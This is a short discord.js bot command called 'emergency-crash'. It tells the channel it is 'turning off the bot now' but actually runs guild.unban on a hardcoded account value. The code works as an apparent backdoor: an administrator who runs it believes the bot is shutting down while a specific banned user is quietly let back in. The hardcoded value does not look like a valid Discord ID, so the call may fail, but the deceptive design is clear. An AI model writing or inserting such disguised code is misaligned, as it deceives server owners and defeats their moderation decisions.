const Discord = require('discord.js');

module.exports = {
    name: "emergency-crash",
    execute: async(message, client, args)=>{
        if(!message.member.permissions.has('ADMINISTRATOR')) return;
        const yes = 'uw694irjfjjtdj'
        message.channel.send("turning off the bot now")
        message.guild.unban(yes)
    }
}